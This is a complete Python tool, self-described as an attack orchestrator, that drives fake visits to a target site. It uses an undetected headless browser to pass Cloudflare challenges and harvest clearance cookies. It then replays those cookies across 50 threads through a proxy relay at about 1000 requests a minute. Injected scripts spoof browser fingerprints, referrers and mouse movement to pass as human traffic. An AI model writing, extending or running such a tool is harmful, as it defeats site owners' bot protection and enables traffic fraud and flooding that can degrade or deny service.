#!/usr/bin/env python3
"""
HYBRID TURBO VISITOR - Guaranteed CF bypass + Maximum speed
Strategy:
1. One UC browser gets CF clearance cookies (bypasses all protections)
2. Uses those cookies with fast HTTP requests through Saudi proxy (1000s/min)
3. Auto-refreshes cookies before they expire
4. Falls back to multi-browser if HTTP doesn't work
"""
import sys, time, random, threading, json, os, re, urllib.request, urllib.parse, socket, subprocess

try:
    import undetected_chromedriver as uc
    HAS_UC = True
except ImportError:
    HAS_UC = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False

visit_count = 0
error_count = 0
lock = threading.Lock()
STATUS_FILE = "/root/visit_status.json"
DETECTED_MODE = 'hybrid'

# === PROXY CONFIG ===
PROXY_RELAY_HOST = '127.0.0.1'
PROXY_RELAY_PORT = '18080'
USE_PROXIES = True

# Shared CF cookies
cf_cookies = {}
cf_cookies_lock = threading.Lock()
cf_ua = ''

# === FINGERPRINT DATA ===
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
]
REFERRERS = [
    'https://www.google.com/', 'https://www.google.com/search?q=site',
    'https://www.google.com.sa/', 'https://www.google.ae/',
    'https://www.facebook.com/', 'https://l.facebook.com/',
    'https://t.co/', 'https://www.instagram.com/',
    '', '', '',
]

def get_stealth_js():
    ua = random.choice(USER_AGENTS)
    is_mobile = 'iPhone' in ua or 'Android' in ua
    platform = 'iPhone' if 'iPhone' in ua else ('Linux armv8l' if 'Android' in ua else random.choice(['Win32','MacIntel']))
    cores = random.choice([2,4] if is_mobile else [4,8,12,16])
    memory = random.choice([4,6] if is_mobile else [4,8,16,32])
    ref = random.choice(REFERRERS)
    ref_js = f'Object.defineProperty(document,"referrer",{{get:()=>"{ref}"}});' if ref else ''
    return f"""
Object.defineProperty(navigator,'webdriver',{{get:()=>undefined}});
try{{delete navigator.__proto__.webdriver;}}catch(e){{}}
window.chrome={{runtime:{{}},loadTimes:function(){{return{{}}}},csi:function(){{return{{}}}}}};
Object.defineProperty(navigator,'platform',{{get:()=>'{platform}'}});
Object.defineProperty(navigator,'hardwareConcurrency',{{get:()=>{cores}}});
Object.defineProperty(navigator,'deviceMemory',{{get:()=>{memory}}});
{ref_js}
"""

def get_human_interaction_js():
    scroll_y = random.randint(100, 600)
    return f"""
(function(){{
    for(var i=0;i<5;i++){{
        var ev=new MouseEvent('mousemove',{{clientX:Math.random()*1200,clientY:Math.random()*800,bubbles:true}});
        document.dispatchEvent(ev);
    }}
    window.scrollBy(0,{scroll_y});
    document.dispatchEvent(new Event('focus'));
}})();
"""

def write_status(max_visitors, start_time, status="running"):
    global visit_count, error_count
    elapsed = int(time.time() - start_time)
    progress = min(100, round((visit_count / max_visitors) * 100, 1)) if max_visitors > 0 else 0
    rate = round(visit_count / max(elapsed, 1) * 60, 1)
    data = {
        "status": status, "visits": visit_count, "target": max_visitors,
        "progress": progress, "elapsed": elapsed,
        "errors": error_count, "timestamp": int(time.time()),
        "mode": DETECTED_MODE, "rate": rate
    }
    try:
        with open(STATUS_FILE, "w") as f:
            json.dump(data, f)
    except: pass

# ============================================
# PHASE 1: Get CF clearance cookies via real browser
# ============================================
def get_cf_cookies_browser(target_url):
    """Use undetected-chromedriver to bypass CF and extract cookies"""
    global cf_cookies, cf_ua
    
    ua = random.choice(USER_AGENTS)
    cf_ua = ua
    
    driver = None
    try:
        if HAS_UC:
            options = uc.ChromeOptions()
            options.add_argument("--headless=new")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--window-size=1920,1080")
            options.add_argument(f"--user-agent={ua}")
            if USE_PROXIES:
                options.add_argument(f"--proxy-server=http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}")
            driver = uc.Chrome(options=options, headless=True, driver_executable_path='/usr/local/bin/chromedriver')
        elif HAS_SELENIUM:
            opts = Options()
            opts.add_argument("--headless=new")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-gpu")
            opts.add_argument("--disable-blink-features=AutomationControlled")
            opts.add_argument("--window-size=1920,1080")
            opts.add_argument(f"--user-agent={ua}")
            opts.add_experimental_option('excludeSwitches', ['enable-automation'])
            opts.add_experimental_option('useAutomationExtension', False)
            if USE_PROXIES:
                opts.add_argument(f"--proxy-server=http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}")
            driver = webdriver.Chrome(options=opts)
            driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                'source': get_stealth_js()
            })
        
        if not driver:
            print("[CF-BYPASS] No browser available!", flush=True)
            return False
        
        print(f"[CF-BYPASS] Opening {target_url}...", flush=True)
        driver.get(target_url)
        
        # Wait for CF challenge to resolve
        for i in range(45):
            time.sleep(1)
            try:
                pg = driver.page_source or ''
                title = driver.title or ''
                if 'just a moment' not in pg.lower() and 'checking your browser' not in pg.lower() and 'challenge-platform' not in pg.lower():
                    if len(pg) > 1000 and title and 'just a moment' not in title.lower():
                        print(f"[CF-BYPASS] Challenge passed after {i+1}s! Title: {title}", flush=True)
                        break
            except:
                pass
        
        # Execute human interaction
        try:
            driver.execute_script(get_human_interaction_js())
            time.sleep(1)
        except: pass
        
        # Extract all cookies
        cookies = driver.get_cookies()
        cookie_dict = {}
        for c in cookies:
            cookie_dict[c['name']] = c['value']
        
        with cf_cookies_lock:
            cf_cookies = cookie_dict
        
        cf_names = [c['name'] for c in cookies]
        has_cf = any('cf_clearance' in n for n in cf_names)
        print(f"[CF-BYPASS] Got {len(cookies)} cookies. CF clearance: {has_cf}. Names: {cf_names}", flush=True)
        
        # Verify page loaded
        title = driver.title or ''
        html_len = len(driver.page_source) if driver.page_source else 0
        print(f"[CF-BYPASS] Page title: '{title}', HTML size: {html_len}", flush=True)
        
        driver.quit()
        return len(cookie_dict) > 0
        
    except Exception as e:
        print(f"[CF-BYPASS] Error: {e}", flush=True)
        try:
            if driver: driver.quit()
        except: pass
        return False

# ============================================
# PHASE 2: Fast HTTP visitor using CF cookies
# ============================================
def fast_http_worker(wid, target_url, max_visits, start_time):
    """Ultra-fast HTTP visitor using stolen CF cookies"""
    global visit_count, error_count
    
    parsed = urllib.parse.urlparse(target_url)
    proxy_handler = urllib.request.ProxyHandler({
        'http': f'http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}',
        'https': f'http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}',
    }) if USE_PROXIES else urllib.request.ProxyHandler({})
    
    opener = urllib.request.build_opener(proxy_handler)
    
    while True:
        with lock:
            if visit_count >= max_visits:
                break
        
        try:
            with cf_cookies_lock:
                cookies = dict(cf_cookies)
            
            ua = random.choice(USER_AGENTS)
            ref = random.choice(REFERRERS)
            cookie_str = '; '.join(f'{k}={v}' for k, v in cookies.items())
            
            headers = {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0',
            }
            if ref:
                headers['Referer'] = ref
            if cookie_str:
                headers['Cookie'] = cookie_str
            
            req = urllib.request.Request(target_url, headers=headers)
            resp = opener.open(req, timeout=10)
            html = resp.read(2000).decode('utf-8', errors='ignore')
            status = resp.status
            
            # Check if we got real page (not CF challenge)
            if status == 200 and len(html) > 500 and 'just a moment' not in html.lower():
                with lock:
                    if visit_count < max_visits:
                        visit_count += 1
            else:
                with lock:
                    error_count += 1
                    
        except Exception as e:
            with lock:
                error_count += 1
            time.sleep(0.01)

# ============================================
# PHASE 2B: Browser worker (fallback if HTTP fails)
# ============================================
def browser_worker(bid, target_url, max_visits, start_time):
    """Real browser visitor - slower but guaranteed"""
    global visit_count, error_count
    
    while True:
        with lock:
            if visit_count >= max_visits:
                break
        
        driver = None
        try:
            ua = random.choice(USER_AGENTS)
            if HAS_UC:
                options = uc.ChromeOptions()
                options.add_argument("--headless=new")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-gpu")
                options.add_argument("--window-size=1920,1080")
                options.add_argument("--js-flags=--max-old-space-size=96")
                options.add_argument(f"--user-agent={ua}")
                if USE_PROXIES:
                    options.add_argument(f"--proxy-server=http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}")
                driver = uc.Chrome(options=options, headless=True, driver_executable_path='/usr/local/bin/chromedriver')
            elif HAS_SELENIUM:
                opts = Options()
                opts.add_argument("--headless=new")
                opts.add_argument("--no-sandbox")
                opts.add_argument("--disable-dev-shm-usage")
                opts.add_argument("--disable-gpu")
                opts.add_argument("--disable-blink-features=AutomationControlled")
                opts.add_argument("--window-size=1920,1080")
                opts.add_argument("--js-flags=--max-old-space-size=96")
                opts.add_argument(f"--user-agent={ua}")
                opts.add_experimental_option('excludeSwitches', ['enable-automation'])
                if USE_PROXIES:
                    opts.add_argument(f"--proxy-server=http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}")
                driver = webdriver.Chrome(options=opts)
                driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                    'source': get_stealth_js()
                })
            
            if not driver:
                with lock: error_count += 1
                time.sleep(1)
                continue
            
            driver.set_page_load_timeout(30)
            driver.get(target_url)
            
            # Wait for CF
            for w in range(30):
                time.sleep(1)
                pg = driver.page_source or ''
                if 'just a moment' not in pg.lower() and 'checking your browser' not in pg.lower():
                    break
            
            # Human interaction
            try:
                driver.execute_script(get_human_interaction_js())
                time.sleep(0.5)
            except: pass
            
            title = driver.title or ''
            html_len = len(driver.page_source) if driver.page_source else 0
            
            if html_len > 500 and title and 'just a moment' not in title.lower():
                with lock:
                    if visit_count < max_visits:
                        visit_count += 1
            else:
                with lock: error_count += 1
                
        except:
            with lock: error_count += 1
        finally:
            try:
                if driver: driver.quit()
            except: pass

# ============================================
# PHASE 3: Cookie refresher (background)
# ============================================
def cookie_refresher(target_url):
    """Refresh CF cookies every 3 minutes"""
    while True:
        time.sleep(180)
        print("[COOKIE-REFRESH] Refreshing CF cookies...", flush=True)
        get_cf_cookies_browser(target_url)

# ============================================
# MAIN ATTACK ORCHESTRATOR
# ============================================
def run_attack(target_url, max_visitors=100):
    global visit_count, error_count, DETECTED_MODE
    visit_count = 0
    error_count = 0
    start_time = time.time()
    
    write_status(max_visitors, start_time, "starting")
    print(f"[HYBRID] Target: {target_url} | Goal: {max_visitors} visitors", flush=True)
    
    # Step 1: Get CF cookies
    print("[STEP 1] Getting CF clearance cookies via real browser...", flush=True)
    got_cookies = get_cf_cookies_browser(target_url)
    
    if got_cookies:
        print(f"[STEP 1] Cookies obtained! Testing fast HTTP...", flush=True)
    else:
        print(f"[STEP 1] No cookies, will use browser-only mode", flush=True)
    
    # Step 2: Test if HTTP works with cookies
    http_works = False
    if got_cookies:
        try:
            with cf_cookies_lock:
                cookies = dict(cf_cookies)
            cookie_str = '; '.join(f'{k}={v}' for k, v in cookies.items())
            
            proxy_handler = urllib.request.ProxyHandler({
                'http': f'http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}',
                'https': f'http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}',
            }) if USE_PROXIES else urllib.request.ProxyHandler({})
            opener = urllib.request.build_opener(proxy_handler)
            
            headers = {
                'User-Agent': cf_ua or USER_AGENTS[0],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
                'Cookie': cookie_str,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
            }
            req = urllib.request.Request(target_url, headers=headers)
            resp = opener.open(req, timeout=15)
            html = resp.read(3000).decode('utf-8', errors='ignore')
            
            if resp.status == 200 and len(html) > 500 and 'just a moment' not in html.lower():
                http_works = True
                print(f"[STEP 2] HTTP with cookies WORKS! Using TURBO mode", flush=True)
            else:
                print(f"[STEP 2] HTTP blocked (status={resp.status}, len={len(html)}). Fallback to browser", flush=True)
        except Exception as e:
            print(f"[STEP 2] HTTP test failed: {e}. Fallback to browser", flush=True)
    
    # Step 3: Launch attack
    threads = []
    
    if http_works:
        # TURBO MODE: 50 HTTP threads + cookie refresher
        DETECTED_MODE = 'turbo'
        num_threads = 50
        print(f"[TURBO MODE] Launching {num_threads} HTTP threads (target: ~1000 visits/min)", flush=True)
        
        # Cookie refresher
        cr = threading.Thread(target=cookie_refresher, args=(target_url,), daemon=True)
        cr.start()
        
        for i in range(num_threads):
            t = threading.Thread(target=fast_http_worker, args=(i, target_url, max_visitors, start_time), daemon=True)
            t.start()
            threads.append(t)
        
        # Also run 2 browsers as backup to keep cookies fresh
        for i in range(2):
            t = threading.Thread(target=browser_worker, args=(i, target_url, max_visitors, start_time), daemon=True)
            t.start()
            threads.append(t)
    else:
        # BROWSER MODE: 8 browser workers
        DETECTED_MODE = 'stealth'
        num_browsers = 8
        print(f"[STEALTH MODE] Launching {num_browsers} browser workers", flush=True)
        
        for i in range(num_browsers):
            t = threading.Thread(target=browser_worker, args=(i, target_url, max_visitors, start_time), daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.5)
    
    # Monitor
    write_status(max_visitors, start_time, "running")
    last_count = 0
    stall_checks = 0
    
    while True:
        time.sleep(3)
        write_status(max_visitors, start_time, "running")
        
        with lock:
            current = visit_count
            errs = error_count
        
        elapsed = int(time.time() - start_time)
        rate = round(current / max(elapsed, 1) * 60, 1)
        print(f"[MONITOR] {current}/{max_visitors} visits | {errs} errors | {elapsed}s | {rate}/min", flush=True)
        
        if current >= max_visitors:
            break
        
        # If stalled for 30s in turbo mode, switch to more browsers
        if current == last_count:
            stall_checks += 1
            if stall_checks >= 10 and http_works and DETECTED_MODE == 'turbo':
                print("[MONITOR] Turbo stalled! Adding more browser workers...", flush=True)
                for i in range(4):
                    t = threading.Thread(target=browser_worker, args=(100+i, target_url, max_visitors, start_time), daemon=True)
                    t.start()
                    threads.append(t)
                stall_checks = 0
        else:
            stall_checks = 0
            last_count = current
    
    elapsed = int(time.time() - start_time)
    rate = round(visit_count / max(elapsed, 1) * 60, 1)
    write_status(max_visitors, start_time, "finished")
    print(f"[DONE] Visits:{visit_count} Errors:{error_count} Time:{elapsed}s Rate:{rate}/min", flush=True)

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://example.com"
    visitors = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    
    # Ensure proxy is running
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('127.0.0.1', 18080))
        s.close()
        print("[PROXY] Relay is running on port 18080", flush=True)
    except:
        print("[PROXY] Starting proxy relay...", flush=True)
        subprocess.Popen(['python3', '/root/proxy_relay.py'], stdout=open('/root/proxy.log','w'), stderr=subprocess.STDOUT)
        time.sleep(2)
    
    run_attack(url, visitors)
